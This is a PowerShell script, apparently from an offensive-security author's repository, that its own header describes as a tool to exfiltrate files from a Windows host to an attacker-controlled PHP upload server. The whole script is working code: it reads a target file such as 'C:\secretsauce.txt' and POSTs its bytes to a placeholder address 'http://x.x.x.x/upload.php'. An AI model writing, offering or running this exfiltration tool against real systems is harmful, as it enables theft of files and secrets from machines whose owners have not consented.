# Author: KaimoSec <https://github.com/kaimosec>
# Allows you to exfiltrate files from Powershell to a PHP server
# Tested on Windows Server 2019

# See upload.php for example PHP script to handle files

# Set these variables in your powershell session before executing
# $uploadUrl = "http://x.x.x.x/upload.php"
# $filePath = "C:\secretsauce.txt"

# Ensure required variables are set
if($uploadUrl -eq $null) {
    Write-Host '$uploadUrl is not set'
    exit
}
if($filePath -eq $null) {
    Write-Host '$filePath is not set'
    exit
}


# Create a new boundary string
$boundary = [System.Guid]::NewGuid().ToString()

# Create a new HTTP request
$webRequest = [System.Net.HttpWebRequest]::Create($uploadUrl)
$webRequest.Method = "POST"

# Set the content type to multipart form data with the boundary
$webRequest.ContentType = "multipart/form-data; boundary=$boundary"

# Open the file and read its content
$fileContent = [System.IO.File]::ReadAllBytes($filePath)

# Create the request body
$requestBody = [System.Text.StringBuilder]::new()
$requestBody.AppendLine("--$boundary")
$requestBody.AppendLine('Content-Disposition: form-data; name="file"; filename="{0}"' -f [System.IO.Path]::GetFileName($filePath))
$requestBody.AppendLine("Content-Type: application/octet-stream")
$requestBody.AppendLine()
$requestBody.Append([System.Text.Encoding]::Default.GetString($fileContent))

$requestBody.AppendLine()
$requestBody.AppendLine("--$boundary--")

# Convert the request body to bytes
$requestBodyBytes = [System.Text.Encoding]::DEFAULT.GetBytes($requestBody.ToString())

# Set the content length header
$webRequest.ContentLength = $requestBodyBytes.Length

# Get the request stream
$requestStream = $webRequest.GetRequestStream()

# Write the request body bytes to the request stream
$requestStream.Write($requestBodyBytes, 0, $requestBodyBytes.Length)

# Close the request stream
$requestStream.Close()

# Send the HTTP request and get the response
$response = $webRequest.GetResponse()

# Get the response stream
$responseStream = $response.GetResponseStream()

# Read the response stream
$reader = [System.IO.StreamReader]::new($responseStream)
$responseContent = $reader.ReadToEnd()

# Close the response stream and reader
$responseStream.Close()
$reader.Close()

# Display the response from the server
$responseContent
